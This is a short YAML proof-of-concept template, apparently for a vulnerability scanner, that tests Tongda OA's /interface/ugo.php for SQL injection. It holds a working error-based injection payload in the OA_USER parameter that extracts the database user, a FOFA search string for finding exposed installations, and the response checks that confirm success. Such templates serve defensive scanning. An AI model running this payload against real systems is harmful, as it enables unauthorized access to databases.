id: poc-yaml-tongda-interface-ugo-sqli
info:
  name: 通达OA ugo.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 通达OA
  fofa: app="TDXK-通达OA"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20md5({{.t1}})),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271
  expression: 'status_code == 200 && (

    contains(gbk_decode(body),`请联系管理员`) || contains(body,`请联系管理员`) ) && (

    contains(gbk_decode(body),`错误`) || contains(body,`错误`) ) &&

    contains(body,t2)

    '
transport: http
